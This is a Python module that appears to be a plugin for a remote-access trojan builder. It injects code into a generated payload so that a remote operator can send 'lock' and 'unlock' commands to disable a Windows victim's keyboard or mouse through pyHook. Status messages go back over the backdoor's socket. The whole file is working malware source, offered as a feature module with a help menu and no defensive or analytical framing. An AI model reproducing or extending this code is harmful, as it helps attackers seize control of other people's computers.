import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyHook')
        config.import_statements.append('import pythoncom')
        config.import_statements.append('import threading')
        config.global_vars.append('keylock = False')
        config.global_vars.append('mouselock = False')
        config.functions.append('''
def disable(event):
    return False


def enable(event):
    return True


def key_lock():
    hm = pyHook.HookManager()
    hm.KeyAll = disable
    hm.HookKeyboard()
    while True:
        if not keylock:
            hm = pyHook.HookManager()
            hm.KeyAll = enable
            hm.HookKeyboard()
            return
        pythoncom.PumpWaitingMessages()


def mouse_lock():
    hm = pyHook.HookManager()
    hm.MouseAll = disable
    hm.HookMouse()
    while True:
        if not mouselock:
            hm = pyHook.HookManager()
            hm.MouseAll = enable
            hm.HookMouse()
            return
        pythoncom.PumpWaitingMessages()


def interface_locker(data):
    global keylock
    global mouselock
    if data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'key' and keylock:
        s.sendall('[-]Keyboard is already locked')
    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'mouse' and mouselock:
        s.sendall('[-]Mouse is already locked')
    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'key':
        keylock = True
        t = threading.Thread(target=key_lock,args=(),)
        t.start()
        s.sendall('[+]Locked keyboard interface')
    elif data.split(' ')[0] == 'lock' and data.split(' ')[1] == 'mouse':
        mouselock = True
        t = threading.Thread(target=mouse_lock,args=(),)
        t.start()
        s.sendall('[+]Locked mouse interface')
    elif data.split(' ')[0] == 'unlock' and data.split(' ')[1] == 'key':
        keylock = False
        s.sendall('[+]Unlocked keyboard interface')
    elif data.split(' ')[0] == 'unlock' and data.split(' ')[1] == 'mouse':
        mouselock = False
        s.sendall('[+]Unlocked mouse interface')
    else:
        s.sendall('[-]Please specify valid interface, key/mouse, to lock/unlock')''')
        config.logics.append('''
            elif command in ('lock','unlock'):
                interface_locker(data)
                ''')
        config.help_menu['lock <key/mouse>'] = 'Disable the keyboard or mouse interface'
        config.help_menu['unlock <key/mouse>'] = 'Enable the keyboard or mouse interface'
    elif option == 'info':
        print '\nName             : Interface locker' \
              '\nOS               : Windows' \
              '\nRequired Modules : PyHook (External), pythoncom (External), threading' \
              '\nCommands         : lock <key/mouse>, unlock <key/mouse> ' \
              '\nDescription      : Disable or enable the keyboard or mouse interface\n'
